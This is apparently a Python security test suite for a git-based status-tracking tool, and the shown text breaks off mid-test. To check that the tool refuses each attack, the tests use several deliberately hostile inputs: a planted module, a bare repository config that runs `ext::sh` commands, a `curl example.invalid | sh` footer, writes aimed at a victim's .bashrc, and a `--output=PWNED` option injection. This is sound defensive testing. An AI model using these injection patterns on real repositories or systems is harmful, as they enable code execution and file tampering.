"""What an independent review found: a repository being judged, a plan from a clone, git failing, and tables built to confuse."""
import hashlib
import json
import os
import pathlib
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from helpers import ENGINE, IDENTITY, ROOT, ProjectCase, clean_env, commit, git, needs_sh
from gitdone import cli, gitio, history, mcp, portfolio, render, scaffold, shipped, table as tables
from gitdone.plan import Plan

SHIM = ROOT / "bin" / "gitdone"
PLANT = "import pathlib; pathlib.Path(r'{mark}').write_text('ran'); raise SystemExit(0)\n"


class TheRepositoryCannotSupplyTheEngine(ProjectCase):
    """Run from inside what is being judged, a planted module must not be what runs."""

    def plant(self, folder):
        self.mark = self.tmp / "planted-code-ran"
        (folder / "gitdone").mkdir(exist_ok=True)
        (folder / "gitdone" / "__init__.py").write_text("")
        (folder / "gitdone" / "__main__.py").write_text(PLANT.format(mark=self.mark))
        (folder / "gitdone" / "cli.py").write_text("def main():\n    " + PLANT.format(mark=self.mark).replace("; ", "\n    "))
        (folder / "json.py").write_text(PLANT.format(mark=self.mark))

    def test_the_plugin_shim(self):
        needs_sh(self)
        self.plant(self.project)
        done = subprocess.run(["sh", str(SHIM), "--version"], cwd=str(self.project), capture_output=True, text=True, stdin=subprocess.DEVNULL)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertRegex(done.stdout, r"^\d+\.\d+\.\d+")
        self.assertFalse(self.mark.exists())

    def test_the_git_hook(self):
        needs_sh(self)
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        self.cli("install-hook")
        self.plant(self.project)
        self.set_row(10, "Live", f"`{self.sha_stray[:7]}`")
        git(self.project, "add", "status-table.md", "STATUS.md")
        done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "a lie"], cwd=str(self.project), env=clean_env(), capture_output=True, text=True)
        self.assertNotEqual(done.returncode, 0, "the planted engine must not get to approve this")
        self.assertIn("is not on main", done.stderr)
        self.assertFalse(self.mark.exists())

    def test_an_innocent_file_with_a_stdlib_name_breaks_nothing(self):
        needs_sh(self)
        (self.project / "json.py").write_text("x = 1\n")
        (self.project / "token.py").write_text("x = 1\n")
        done = subprocess.run(["sh", str(SHIM), "--version"], cwd=str(self.project), capture_output=True, text=True, stdin=subprocess.DEVNULL)
        self.assertEqual(done.returncode, 0, done.stderr)


@unittest.skipIf(os.name == "nt", "the runner's bash is what is being imitated")
class TheActionCannotBeGivenAnotherEngine(ProjectCase):
    def test_a_planted_engine_does_not_turn_a_lie_green(self):
        from test_action import script
        self.change_plan(release=None)
        (self.project / ".gitdone.json").write_text(json.dumps({"plan": "plan.json"}))
        self.set_row(10, "Live", f"`{self.sha_stray[:7]}`")
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        mark = self.tmp / "planted"
        (self.project / "gitdone").mkdir()
        (self.project / "gitdone" / "__init__.py").write_text("")
        (self.project / "gitdone" / "__main__.py").write_text(PLANT.format(mark=mark))
        (self.project / "json.py").write_text(PLANT.format(mark=mark))
        event = self.tmp / "event.json"
        event.write_text("{}")
        env = {**os.environ, "HOME": str(self.tmp / "home"), "ST_HOME": str(ROOT), "GITHUB_EVENT_PATH": str(event), "ST_PLAN": "", "ST_STRICT": "false",
               "ST_COMMENT": "false", "ST_ALWAYS": "false", "ST_PUBLISH": "", "GH_TOKEN": "a-token-a-planted-engine-would-read"}
        done = subprocess.run(["bash", "-e", "-c", script()], cwd=str(self.project), env=env, capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(done.returncode, 1, done.stdout + done.stderr)
        self.assertFalse(mark.exists())


class APlanFromACloneIsUntrusted(ProjectCase):
    def test_a_committed_bare_repository_cannot_run_a_command(self):
        version = subprocess.run(["git", "version"], capture_output=True, text=True).stdout
        numbers = tuple(int(n) for n in version.split()[2].split(".")[:2])
        if numbers < (2, 38):
            self.skipTest("safe.bareRepository needs git 2.38")
        mark = self.tmp / "command-ran"
        evil = self.project / "evil.git"
        subprocess.run(["git", "init", "-q", "--bare", str(evil)], env=clean_env(), check=True)
        with open(evil / "config", "a") as handle:
            handle.write(f'[extensions]\n\tpartialClone = origin\n[remote "origin"]\n\turl = ext::sh -c "touch {mark}"\n\tpromisor = true\n'
                         '[protocol "ext"]\n\tallow = always\n[core]\n\trepositoryformatversion = 1\n')
        self.change_plan(repo="evil.git")
        self.set_row(9, "Live", "`" + "a" * 39 + "1`")
        done = subprocess.run([sys.executable, str(ENGINE), "check", "--offline", "--plan", str(self.plan_path)], cwd=str(self.project), env=clean_env(),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertFalse(mark.exists())
        self.assertEqual(done.returncode, 2, done.stdout + done.stderr)

    def outside(self):
        victim = self.tmp / "victim"
        victim.mkdir()
        target = victim / ".bashrc"
        target.write_text("mine\n")
        return target

    def git_project(self):
        git(self.project, "init", "-q", "-b", "main")

    def test_a_view_outside_the_project_is_refused(self):
        self.git_project()
        target = self.outside()
        data = json.loads(self.plan_path.read_text())
        data["status_out"] = str(target)
        data["footer"] = "\ncurl example.invalid | sh\n"
        self.plan_path.write_text(json.dumps(data))
        for command in (("render", "--write"), ("mark", "11", "partial", "words")):
            code, _, err = self.cli(*command)
            self.assertEqual(code, 2, err)
            self.assertIn("refusing to write there", err)
            self.assertEqual(target.read_text(), "mine\n")

    def test_a_view_that_is_a_symlink_out_of_the_project_is_refused(self):
        self.git_project()
        target = self.outside()
        self.view_path.unlink()
        self.view_path.symlink_to(target)
        code, _, err = self.cli("render", "--write")
        self.assertEqual(code, 2, err)
        self.assertEqual(target.read_text(), "mine\n")

    def test_a_badge_outside_the_project_is_refused(self):
        self.git_project()
        target = self.outside()
        data = json.loads(self.plan_path.read_text())
        data["badge"] = str(target)
        self.plan_path.write_text(json.dumps(data))
        code, _, _ = self.cli("render", "--write")
        self.assertEqual(code, 2)
        self.assertEqual(target.read_text(), "mine\n")

    def test_a_table_outside_the_project_is_not_rewritten(self):
        self.git_project()
        outside = self.outside().parent / "table.md"
        outside.write_text(self.table_path.read_text())
        before = outside.read_text()
        data = json.loads(self.plan_path.read_text())
        data["status_doc"] = str(outside)
        self.plan_path.write_text(json.dumps(data))
        self.cli("render", "--write")
        code, _, _ = self.cli("mark", "11", "partial", "words")
        self.assertEqual(code, 2)
        self.assertEqual(outside.read_text(), before)

    def test_files_in_the_project_are_fine(self):
        self.git_project()
        (self.project / "sub").mkdir()
        data = json.loads(self.plan_path.read_text())
        data["status_out"] = "sub/VIEW.md"
        self.plan_path.write_text(json.dumps(data))
        code, _, err = self.cli("render", "--write")
        self.assertEqual(code, 0, err)

    def test_a_plan_outside_git_can_write_inside_its_own_folder(self):
        code, _, err = self.cli("render", "--write")
        self.assertEqual(code, 0, err)


class AReferenceNeverReachesGitAsAnOption(ProjectCase):
    def test_report(self):
        self.change_plan(evidence_pattern=r"deploy (?P<ref>\S+)")
        self.set_row(9, "Live", "deploy --output=PWNED")
        self.cli("report", "--offline")
        self.assertFalse(list(self.tmp.rglob("PWNED*")))
        self.assertFalse(list(pathlib.Path.cwd().glob("PWNED*")))

    def test_ci_base(self):
        from gitdone import ci
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        self.assertTrue(ci.touched(self.plan(), "--output=PWNED"))
        self.assertFalse(list(self.project.glob("PWNED*")))


class ReadingWritesNothing(ProjectCase):
    def index_hash(self):
        return hashlib.sha256((self.project / ".git" / "index").read_bytes()).hexdigest()

    def test_week_and_chart_leave_the_index_alone(self):
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        os.utime(self.table_path, (1, 1))  # a stat change is what makes `git status` want to refresh the index
        before = self.index_hash()
        self.cli("week")
        self.cli("chart", "--csv")
        self.assertEqual(self.index_hash(), before)


class GitFailingIsNotAnAnswer(ProjectCase):
    def failing(self, verb, code=128):
        real = gitio.git

        def fake(repo, *args, **kwargs):
            if verb in args:
                return gitio.Done(code, "", "fatal: bad object")
            return real(repo, *args, **kwargs)
        return mock.patch.object(gitio, "git", fake)

    def test_an_ancestry_check_that_fails_is_exit_2_not_a_contradiction(self):
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        with self.failing("merge-base"), self.failing("rev-list"), self.failing("log"):
            code, _, err = self.cli("check", "--offline")
        self.assertEqual(code, 2, err)
        self.assertIn("git could not answer", err)

    def test_a_timeout_is_exit_2(self):
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        with self.failing("merge-base", 124), self.failing("rev-list", 124), self.failing("log", 124):
            code, _, _ = self.cli("check", "--offline")
        self.assertEqual(code, 2)

    def test_a_failing_bulk_read_falls_back_to_the_same_answer(self):
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        expected = self.cli("check", "--offline")
        with self.failing("rev-list"):
            self.assertEqual(self.cli("check", "--offline")[:2], expected[:2])

    def test_a_lookup_that_fails_is_not_a_commit_that_is_missing(self):
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        with self.failing("cat-file"):
            code, _, err = self.cli("check", "--offline")
        self.assertEqual(code, 2, err)


class RevertsItUsedToMiss(ProjectCase):
    def merged_feature(self):
        git(self.app, "checkout", "-q", "-b", "feature")
        inside = commit(self.app, "feature.txt", "x\n", "Inside the branch")
        git(self.app, "checkout", "-q", "main")
        git(self.app, "merge", "-q", "--no-ff", "-m", "Merge the feature", "feature")
        return inside, git(self.app, "rev-parse", "HEAD")

    def test_reverting_a_merge_reverts_what_it_brought_in(self):
        inside, merge = self.merged_feature()
        self.set_row(9, "Live", f"`{inside[:7]}`")
        self.assertEqual(self.cli("check", "--offline")[0], 0)
        git(self.app, "revert", "--no-edit", "-m", "1", merge)
        code, out, _ = self.cli("check", "--offline")
        self.assertEqual(code, 1, out)
        self.assertIn(f"commit {inside[:7]} was reverted on main", out)

    def test_reverting_that_revert_puts_it_back(self):
        inside, merge = self.merged_feature()
        self.set_row(9, "Live", f"`{inside[:7]}`")
        git(self.app, "revert", "--no-edit", "-m", "1", merge)
        git(self.app, "revert", "--no-edit", "HEAD")
        self.assertEqual(self.cli("check", "--offline")[0], 0)

    def squashed(self, number=30):
        return commit(self.app, "feature.txt", "x\n", f"Add the feature (#{number})")

    def undo(self, name, message):
        git(self.app, "rm", "-q", name)
        git(self.app, "commit", "-q", "-m", message)

    def test_a_cited_squash_commit_reverted_by_its_pull_request_number(self):
        sha = self.squashed()
        self.set_row(9, "Live", f"`{sha[:7]}`")
        self.undo("feature.txt", 'Revert "Add the feature (#30)" (#31)\n\nReverts someone/kiosk#30')
        code, out, _ = self.cli("check", "--offline")
        self.assertEqual(code, 1, out)
        self.assertIn("was reverted on main", out)

    def test_a_merge_commit_cited_and_reverted_by_its_pull_request_number(self):
        git(self.app, "checkout", "-q", "-b", "f")
        inside = commit(self.app, "f.txt", "x\n", "Inside")
        git(self.app, "checkout", "-q", "main")
        git(self.app, "merge", "-q", "--no-ff", "-m", "Merge pull request #30 from someone/f", "f")
        self.set_row(9, "Live", f"`{inside[:7]}`")
        self.undo("f.txt", 'Revert "Merge pull request #30"\n\nReverts someone/kiosk#30')
        self.assertEqual(self.cli("check", "--offline")[0], 1)

    def test_a_revert_of_the_revert_pull_request_puts_the_first_back(self):
        needs_sh(self)
        self.add_remote()
        self.fake_gh(prs=[{"number": 12, "state": "MERGED", "baseRefName": "main"}, {"number": 30, "state": "MERGED", "baseRefName": "main"}])
        self.set_row(9, "Live", "PR #30")
        commit(self.app, "added.txt", "x\n", "Add it (#30)")
        self.undo("added.txt", 'Revert "Add it" (#31)\n\nReverts someone/kiosk#30')
        self.assertEqual(self.cli("check")[0], 1)
        commit(self.app, "added.txt", "x\n", 'Revert "Revert" (#32)\n\nReverts someone/kiosk#31')
        code, out, _ = self.cli("check")
        self.assertNotIn("PR #30 was reverted", out)

    def test_gitlabs_wording_for_a_reverted_merge_request(self):
        needs_sh(self)
        self.add_remote()
        bin_dir = self.tmp / "bin"
        bin_dir.mkdir(exist_ok=True)
        answer = self.tmp / "glab.json"
        answer.write_text(json.dumps({"iid": 12, "state": "merged", "target_branch": "main"}))
        glab = bin_dir / "glab"
        glab.write_text(f'#!/bin/sh\ncat "{answer}"\n')
        glab.chmod(glab.stat().st_mode | stat.S_IEXEC)
        self.set_row(9, "Live", "MR !12")
        commit(self.app, "added.txt", "x\n", "Add it")
        self.undo("added.txt", 'Revert "Add it"\n\nThis reverts merge request !12\n\nSee merge request o/r!13')
        with mock.patch.dict(os.environ, {"PATH": f"{bin_dir}{os.pathsep}{os.environ['PATH']}"}):
            code, out, _ = self.cli("check")
        self.assertEqual(code, 1, out)
        self.assertIn("MR !12 was reverted on main", out)


class ClaimsItWronglyFailedOrPassed(ProjectCase):
    def test_another_repositorys_pull_request_is_not_evidence(self):
        needs_sh(self)
        git(self.app, "remote", "add", "origin", "https://github.com/someone/kiosk.git")
        self.fake_gh(prs=[{"number": 12, "state": "MERGED", "baseRefName": "main"}, {"number": 7, "state": "MERGED", "baseRefName": "main"}])
        self.set_row(9, "Live", "fixed upstream in https://github.com/vendor/lib/pull/7")
        code, out, _ = self.cli("check")
        self.assertIn("row 9 names no commit", out)
        self.assertEqual(self.cli("check", "--strict")[0], 3)

    def test_this_repositorys_url_is(self):
        needs_sh(self)
        self.add_remote("git@github.com:someone/kiosk.git")
        self.fake_gh(prs=[{"number": 12, "state": "MERGED", "baseRefName": "main"}, {"number": 7, "state": "MERGED", "baseRefName": "main"}])
        self.set_row(9, "Live", "https://github.com/someone/kiosk/pull/7")
        self.assertEqual(self.cli("check", "--strict")[0], 0)

    def test_another_repositorys_revert_does_not_touch_ours(self):
        needs_sh(self)
        git(self.app, "remote", "add", "origin", "https://github.com/someone/kiosk.git")
        self.fake_gh(prs=[{"number": 12, "state": "MERGED", "baseRefName": "main"}, {"number": 30, "state": "MERGED", "baseRefName": "main"}])
        self.set_row(9, "Live", "PR #30")
        git(self.app, "commit", "-q", "--allow-empty", "-m", "Bump lib\n\nReverts vendor/lib#30")
        self.assertEqual(self.cli("check")[0], 0)

    def test_a_tag_with_build_metadata(self):
        git(self.app, "tag", "v1.2.0+build5", self.sha_main)
        self.set_row(9, "Live", "tag `v1.2.0+build5`")
        self.assertEqual(self.cli("check", "--offline")[0], 0)

    def test_a_squash_that_quotes_a_revert_and_its_reapply_is_not_a_revert(self):
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        self.set_row(9, "Live", f"`{feature[:7]}`")
        git(self.app, "commit", "-q", "--allow-empty", "-m", f"Squash a branch\n\nThis reverts commit {feature}.\n\nThis reverts commit {'b' * 40}.")
        self.assertEqual(self.cli("check", "--offline")[0], 0)

    def test_one_message_really_reverting_two_commits_still_counts(self):
        first = commit(self.app, "f.txt", "x\n", "First")
        second = commit(self.app, "g.txt", "x\n", "Second")
        self.set_row(9, "Live", f"`{first[:7]}`")
        git(self.app, "rm", "-q", "f.txt", "g.txt")
        git(self.app, "commit", "-q", "-m", f"Back out both\n\nThis reverts commit {first}.\n\nThis reverts commit {second}.")
        self.assertEqual(self.cli("check", "--offline")[0], 1)

    def test_an_invented_commit_in_a_repository_with_a_remote_stops_a_strict_hook(self):
        needs_sh(self)
        self.add_remote()
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        self.cli("install-hook")
        self.set_row(10, "Live", "shipped in deadbeef12")
        git(self.project, "add", "status-table.md", "STATUS.md")
        done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "x"], cwd=str(self.project), env=clean_env(), capture_output=True, text=True)
        self.assertNotEqual(done.returncode, 0)
        self.assertIn("fetch, or correct it", done.stderr)


class TheEnginesOwnNotesDoNotTrapARow(ProjectCase):
    def row(self, n):
        return tables.load_clean(self.plan()).rows[n]

    def test_ship_revert_mark_ship_again(self):
        first = commit(self.app, "f.txt", "x\n", "Feature")
        self.cli("shipped", "10", first[:7], "--offline")
        git(self.app, "revert", "--no-edit", first)
        self.cli("mark", "10", "partial", "it", "broke")
        again = commit(self.app, "f.txt", "y\n", "Again")
        code, _, err = self.cli("shipped", "10", again[:7], "--offline")
        self.assertEqual(code, 0, err)
        self.assertNotIn(first[:7], self.row(10).note)
        self.set_row(9, "Live", f"`{again[:7]}`")
        self.set_row(2, "Partial", "x")
        self.assertEqual(self.cli("check", "--offline", "--strict")[0], 0)

    def test_a_live_row_given_a_new_commit_drops_the_reverted_one(self):
        first = commit(self.app, "f.txt", "x\n", "Feature")
        self.cli("shipped", "10", first[:7], "--offline")
        git(self.app, "revert", "--no-edit", first)
        again = commit(self.app, "f.txt", "y\n", "Again")
        code, _, err = self.cli("shipped", "10", again[:7], "--offline")
        self.assertEqual(code, 0, err)
        self.assertNotIn(first[:7], self.row(10).note)

    def test_marking_a_second_branch_replaces_the_first(self):
        self.cli("mark", "11", "built", "--branch", "reading-lists")
        self.cli("mark", "11", "built", "--branch", "renewals")
        note = self.row(11).note
        self.assertIn("renewals", note)
        self.assertNotIn("reading-lists", note)


class TablesBuiltToConfuse(ProjectCase):
    def parse(self, text):
        return tables.parse(text, self.plan().kinds)

    def test_a_prose_domains_number_cannot_replace_a_real_row(self):
        text = ("### 1. A (2)\n\n| # | N | Status | N |\n|---|---|---|---|\n| 1 | a | Not built | |\n| 2 | b | Not built | |\n\n### 2. Prose (2)\n\nWords.\n\n"
                "### 3. B (1)\n\n| # | N | Status | N |\n|---|---|---|---|\n| 3 | Three | Live | deadbee1 |\n")
        table = self.parse(text)
        self.assertTrue(any("row 3" in p and "counts it too" in p for p in table.problems), table.problems)
        self.assertEqual(table.rows[3].name, "Three", "the real row stays the one judged")

    def test_a_header_in_a_code_fence_is_an_example(self):
        table = self.parse("Intro:\n\n```\n### 7. Domain name (40)\n```\n\n### 1. A (1)\n\n| 1 | a | Not built | |\n")
        self.assertEqual(len(table.rows), 1)
        self.assertEqual(table.problems, [])

    def test_rows_in_a_code_fence_are_examples(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n\n~~~\n| 2 | b | Live | x |\n~~~\n")
        self.assertEqual(list(table.rows), [1])

    def test_a_byte_order_mark_does_not_hide_the_first_domain(self):
        table = self.parse("﻿### 1. A (1)\n\n| 1 | a | Not built | |\n")
        self.assertEqual(len(table.domains), 1)
        self.assertEqual(len(table.rows), 1)

    def test_a_counts_table_at_the_end_of_the_file_is_not_rows(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n\n| # | Domain | All | Live |\n|---|---|---|---|\n| 1 | A | 1 | 0 |\n")
        self.assertEqual(table.problems, [])
        self.assertEqual(len(table.rows), 1)

    def test_a_year_in_a_domains_name_is_not_its_count(self):
        table = self.parse("### 1. Launch (2026) (1)\n\n| 1 | a | Not built | |\n")
        self.assertEqual(table.domains[0].count, 1)
        self.assertEqual(table.domains[0].name, "Launch (2026)")

    def test_rows_in_an_html_comment_are_not_the_scope(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n<!--\n| 2 | b | Live | x |\n-->\n")
        self.assertEqual(list(table.rows), [1])
        self.assertEqual(table.problems, [])

    def test_rows_in_an_indented_block_are_not_the_scope(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n\n    | 2 | b | Live | x |\n")
        self.assertEqual(list(table.rows), [1])

    def test_a_row_the_parser_cannot_read_is_said(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n| 2a | Hard thing | Not built |  |\n3 | Hard thing | Not built |  |\n> | 4 | Hard thing | Not built |  |\n")
        self.assertEqual(len(table.strays), 3)

    def test_a_row_under_a_typed_heading_is_said(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Live | x |\n\n### 2. Hard (4 rows)\n\n| 2 | b | Not built | |\n")
        self.assertEqual(len(table.strays), 2, "the heading, and the row under it")

    def test_the_strict_gate_refuses_what_it_could_not_read(self):
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        self.assertEqual(self.cli("check", "--offline", "--strict")[0], 0)
        self.table_path.write_text(self.table_path.read_text().replace("| 11 | Account notices | Not built | |", "| 11 | Account notices | Not built | |\n| 12a | Hidden | Not built | |"))
        code, out, _ = self.cli("check", "--offline", "--strict")
        self.assertEqual(code, 3, out)
        self.assertIn("looks like a row or a domain and is not read as one", out)

    def test_an_empty_table_stops_the_gate(self):
        self.table_path.write_text("")
        self.assertEqual(self.cli("check", "--offline")[0], 1)

    def test_the_third_column_must_say_status(self):
        table = self.parse("### 1. A (1)\n\n| # | Name | What I wish | Actual status |\n|---|---|---|---|\n| 1 | a | Live | Not built |\n")
        self.assertTrue(any("the third column is the status" in p for p in table.problems))

    def test_a_repeated_domain_number_is_a_shape_problem(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n\n### 1. B (1)\n\n| 2 | b | Live | x |\n")
        self.assertIn("domain 1 appears twice", table.problems)

    def test_a_huge_count_with_no_table_does_not_hang(self):
        table = self.parse("### 1. All (9999999999)\n")
        self.assertTrue(any("the most is" in p for p in table.problems))

    def test_a_doubtful_status_is_not_a_status(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Live? (not really) | x |\n")
        self.assertTrue(any("unknown status" in p for p in table.problems))

    def test_a_superscript_is_not_a_row_number(self):
        table = self.parse("### 1. A (1)\n\n| 1 | a | Not built | |\n| ² | b | Live | x |\n")
        self.assertEqual(list(table.rows), [1])

    def test_a_backslash_in_a_domains_name_survives_add(self):
        self.change_plan(rows_total=None, groups=None, sections=None, products=None, workstreams=None, order=None, release=None)
        self.table_path.write_text("### 1. ops\\network (1)\n\n| # | N | Status | N |\n|---|---|---|---|\n| 1 | a | Not built | |\n")
        self.cli("render", "--write")
        code, _, err = self.cli("add", "Beta", "--domain", "1")
        self.assertEqual(code, 0, err)
        self.assertIn("### 1. ops\\network (2)", self.table_path.read_text())

    def test_a_built_row_cannot_be_added_without_a_branch(self):
        self.change_plan(rows_total=None, groups=None, sections=None, products=None, workstreams=None, order=None, release=None)
        code, _, err = self.cli("add", "Half", "--kind", "built")
        self.assertEqual(code, 1)
        self.assertIn("--branch", err)

    def test_one_crlf_line_does_not_turn_a_whole_file_crlf(self):
        path = self.tmp / "mixed.md"
        path.write_bytes(b"a\r\nb\nc\n")
        self.assertEqual(shipped.read_keeping_newlines(path)[1], "\n")
        path.write_bytes(b"a\r\nb\r\n")
        self.assertEqual(shipped.read_keeping_newlines(path)[1], "\r\n")


class TheOneLineHook(unittest.TestCase):
    """`check --if-staged` with no --plan, as the pre-commit framework and a hand-written hook run it."""

    def setUp(self):
        needs_sh(self)
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.dir = pathlib.Path(self._tmp.name).resolve() / "mono"
        self.dir.mkdir()
        self.home = self.dir.parent / "home"
        self.home.mkdir()
        git(self.dir, "init", "-q", "-b", "main")
        self.first = commit(self.dir, "a.txt", "1\n", "first")

    def engine(self, *args, cwd=None):
        return subprocess.run([sys.executable, str(ENGINE), *args], cwd=str(cwd or self.dir), capture_output=True, text=True, encoding="utf-8",
                              stdin=subprocess.DEVNULL, env={**clean_env(), "HOME": str(self.home)})

    def gate(self, cwd=None):
        return self.engine("check", "--if-staged", "--strict", cwd=cwd)

    def test_a_branch_with_no_tracker_is_left_alone(self):
        (self.dir / "b.txt").write_text("x\n")
        git(self.dir, "add", "b.txt")
        done = self.gate()
        self.assertEqual((done.returncode, done.stdout, done.stderr), (0, "", ""))

    def test_a_tracker_in_a_subfolder_is_judged_from_the_root(self):
        package = self.dir / "packages" / "a"
        package.mkdir(parents=True)
        self.engine("init", "--rows", "A, B", "--dir", str(package))
        git(self.dir, "add", "-A")
        done = self.gate()
        self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
        self.assertIn("result: PASS", done.stdout)
        table = package / "status-table.md"
        table.write_text(table.read_text().replace("| 1 | A | Not built |  |", "| 1 | A | Live | `deadbee1` |"))
        git(self.dir, "add", "-A")
        done = self.gate()
        self.assertNotEqual(done.returncode, 0)

    def test_a_half_typed_file_on_disk_and_not_staged_does_not_stop_a_commit(self):
        self.engine("init", "--rows", "A")
        git(self.dir, "add", "-A")
        git(self.dir, "commit", "-q", "--no-verify", "-m", "tracker")
        (self.dir / ".gitdone.json").write_text("{ half")
        (self.dir / "b.txt").write_text("x\n")
        git(self.dir, "add", "b.txt")
        self.assertEqual(self.gate().returncode, 0)

    def test_a_broken_plan_being_committed_is_this_commits_business(self):
        self.engine("init", "--rows", "A")
        (self.dir / ".gitdone.json").write_text("{ half")
        git(self.dir, "add", "-A")
        self.assertNotEqual(self.gate().returncode, 0)

    def test_removing_the_tracker_is_allowed(self):
        self.engine("init", "--rows", "A", "--hook")
        git(self.dir, "add", "-A")
        git(self.dir, "commit", "-q", "-m", "tracker", env={"HOME": str(self.home)})
        git(self.dir, "rm", "-q", ".gitdone.json", "status-table.md", "STATUS.md")
        done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "stop tracking"], cwd=str(self.dir), env={**clean_env(), "HOME": str(self.home)},
                              capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)


class TwoTrackersInOneRepository(unittest.TestCase):
    def test_the_hook_holds_both_to_it(self):
        needs_sh(self)
        with tempfile.TemporaryDirectory() as holder:
            root = pathlib.Path(holder).resolve() / "mono"
            home = pathlib.Path(holder).resolve() / "home"
            home.mkdir()
            (root / "a").mkdir(parents=True)
            (root / "b").mkdir()
            git(root, "init", "-q", "-b", "main")
            commit(root, "c.txt", "1\n", "first")

            def engine(folder, *args):
                return subprocess.run([sys.executable, str(ENGINE), *args], cwd=str(folder), capture_output=True, text=True, encoding="utf-8",
                                      stdin=subprocess.DEVNULL, env={**clean_env(), "HOME": str(home)})
            engine(root / "a", "init", "--rows", "A1, A2", "--hook")
            engine(root / "b", "init", "--rows", "B1, B2", "--hook")
            git(root, "add", "-A")
            git(root, "commit", "-q", "--no-verify", "-m", "trackers")
            table = root / "a" / "status-table.md"
            table.write_text(table.read_text().replace("| 1 | A1 | Not built |  |", "| 1 | A1 | Live | `deadbee` |"))
            engine(root / "a", "render", "--write")
            git(root, "add", "-A")
            done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "tracker a: a lie"], cwd=str(root), env={**clean_env(), "HOME": str(home)},
                                  capture_output=True, text=True)
            self.assertNotEqual(done.returncode, 0, "the first tracker keeps its gate")


class Hooks(ProjectCase):
    def setUp(self):
        super().setUp()
        git(self.project, "init", "-q", "-b", "main")
        self.hook = self.project / ".git" / "hooks" / "pre-commit"

    def test_a_persons_hook_that_only_mentions_the_words_is_theirs(self):
        self.hook.parent.mkdir(parents=True, exist_ok=True)
        text = "#!/bin/sh\nnpm test\n# gitdone gate lives elsewhere\n"
        self.hook.write_text(text)
        code, _, err = self.cli("install-hook")
        self.assertEqual(code, 2)
        self.assertIn("is not this gate", err)
        self.assertEqual(self.hook.read_text(), text)

    def test_a_shared_hooks_folder_is_refused(self):
        shared = self.tmp / "shared-hooks"
        shared.mkdir()
        git(self.project, "config", "core.hooksPath", str(shared))
        code, _, err = self.cli("install-hook")
        self.assertEqual(code, 2)
        self.assertIn("which other repositories share", err)
        self.assertEqual(list(shared.iterdir()), [])

    def test_the_hook_has_unix_line_ends(self):
        self.cli("install-hook")
        self.assertNotIn(b"\r", self.hook.read_bytes())

    def test_an_apostrophe_in_the_engines_path_is_not_a_moved_engine(self):
        from gitdone import doctor
        self.cli("install-hook")
        text = self.hook.read_text().replace(f"home={ROOT}", "home='" + str(self.tmp) + "/it'\"'\"'s'", 1)
        target = self.tmp / "it's" / "gitdone"
        target.mkdir(parents=True)
        (target / "__main__.py").write_text("")
        self.hook.write_text(text)
        (self.project / ".git" / "hooks" / "pre-merge-commit").write_text(text)
        item = doctor._hook(self.plan())
        self.assertNotIn("moved", item["detail"])


class ExitCodes(ProjectCase):
    def test_a_reader_that_stops_early_does_not_change_the_gates_answer(self):
        self.set_row(1, "Live", f"`{self.sha_stray[:7]}`")
        real = print
        calls = []

        def fragile(*args, **kwargs):
            calls.append(args)
            raise BrokenPipeError()
        with mock.patch("builtins.print", fragile), mock.patch("os.dup2"), mock.patch("sys.stdout.fileno", return_value=1, create=True):
            code = cli.main(["check", "--offline", "--plan", str(self.plan_path)])
        real("", end="")
        self.assertEqual(code, 1)

    def test_a_crash_under_json_is_still_json(self):
        with mock.patch("gitdone.gate.report", side_effect=ValueError("boom")):
            code, out, _ = self.cli("check", "--json")
        self.assertEqual(code, 2)
        self.assertIn("could not run", json.loads(out)["error"])


class TheServerSurvives(ProjectCase):
    def test_bad_calls_get_answers(self):
        for params in (["status"], {"name": 5}, {"name": "status", "arguments": [1]}, {"name": "status", "arguments": {"project": 5}},
                       {"name": "week", "arguments": {"project": str(self.plan_path), "since": 5}},
                       {"name": "week", "arguments": {"project": str(self.plan_path), "since": "a\0b"}},
                       {"name": "portfolio", "arguments": {"folder": 5}}):
            answer = mcp.handle({"id": 1, "method": "tools/call", "params": params})
            self.assertTrue(answer["result"].get("isError"), params)

    def test_initialize_with_odd_params(self):
        self.assertIn("result", mcp.handle({"id": 1, "method": "initialize", "params": [1]}))

    def test_the_stream_keeps_going_after_a_bad_call(self):
        import io
